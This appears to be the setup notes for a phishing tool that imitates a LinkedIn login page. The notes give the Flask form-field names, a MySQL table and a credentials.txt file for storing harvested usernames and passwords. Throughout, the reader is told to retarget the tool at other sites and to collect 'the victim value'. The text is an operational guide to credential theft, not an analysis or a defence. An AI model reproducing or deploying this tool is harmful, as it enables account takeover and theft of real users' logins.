python index.py ----- To run the program

username = request.form.get('session_key')
password = request.form.get('session_password')
change the get value of the username and password to the id or name of the form input you want to target


connect your database:
db_config = {
    'host': 'localhost',
    'user': 'root',  # Default MySQL username
    'password': '',  # Empty password (you can replace this with your actual password if set)
    'database': 'social_eng_python'
}
change the database value to your own database name



insert_query = "INSERT INTO user_credentials (username, password) VALUES (%s, %s)"
cursor.execute(insert_query, (username, password))
create a table name user_credentials, then give it column of username and password.
the user_credentials is where the value of the victim will be showing in the database after you have successfully connect you code with mysql database.



and don't forget that we have a file in the folder named credentials.txt, the victim value is also saving in the file, you can also be checking that.


# Hardcoded website link
website_url = 'https://www.linkedin.com/uas/login?fromSignIn=true&trk=cold_join_sign_in%27'
change the website_url value to the website you want to target

check your database table to see the victim value


run your code with python social-engineer.py
